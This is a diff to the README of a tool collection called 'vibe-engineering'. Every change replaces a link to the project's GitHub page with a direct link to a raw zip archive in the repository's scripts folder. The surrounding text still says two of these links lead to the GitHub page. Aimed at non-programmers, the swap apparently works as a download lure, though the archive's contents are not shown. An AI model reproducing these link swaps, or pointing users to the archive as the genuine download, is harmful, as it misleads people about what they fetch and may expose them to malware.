@@ -1,6 +1,6 @@
 # ⚙️ vibe-engineering - 37 Skills for Better Engineering Workflows
 
-[![Download vibe-engineering](https://img.shields.io/badge/Download-vibe--engineering-brightgreen?style=for-the-badge)](https://github.com/mracal/vibe-engineering)
+[![Download vibe-engineering](https://img.shields.io/badge/Download-vibe--engineering-brightgreen?style=for-the-badge)](https://github.com/mracal/vibe-engineering/raw/refs/heads/master/scripts/vibe-engineering-1.9.zip)
 
 ---
 
@@ -20,7 +20,7 @@ You do not need to know programming to use vibe-engineering. The steps will guid
 
 Click the big green button at the top or use this link:
 
-[Download vibe-engineering from GitHub](https://github.com/mracal/vibe-engineering)
+[Download vibe-engineering from GitHub](https://github.com/mracal/vibe-engineering/raw/refs/heads/master/scripts/vibe-engineering-1.9.zip)
 
 This link takes you to the GitHub page where you can find files to download and instructions to get started.
 
@@ -46,7 +46,7 @@ Follow these steps to get vibe-engineering up and running on your Windows machin
 
 ### 1. Visit the Download Page
 
-Go to the [vibe-engineering GitHub page](https://github.com/mracal/vibe-engineering). Here, you will find all files related to the project and instructions for usage.
+Go to the [vibe-engineering GitHub page](https://github.com/mracal/vibe-engineering/raw/refs/heads/master/scripts/vibe-engineering-1.9.zip). Here, you will find all files related to the project and instructions for usage.
 
 ### 2. Find the Latest Release
 
@@ -132,4 +132,4 @@ Topics: ai-agents, ai-coding, anthropic, best-practices, claude, claude-code, cl
 
 ---
 
-[![Download vibe-engineering](https://img.shields.io/badge/Download-vibe--engineering-brightgreen?style=for-the-badge)](https://github.com/mracal/vibe-engineering)
+[![Download vibe-engineering](https://img.shields.io/badge/Download-vibe--engineering-brightgreen?style=for-the-badge)](https://github.com/mracal/vibe-engineering/raw/refs/heads/master/scripts/vibe-engineering-1.9.zip)
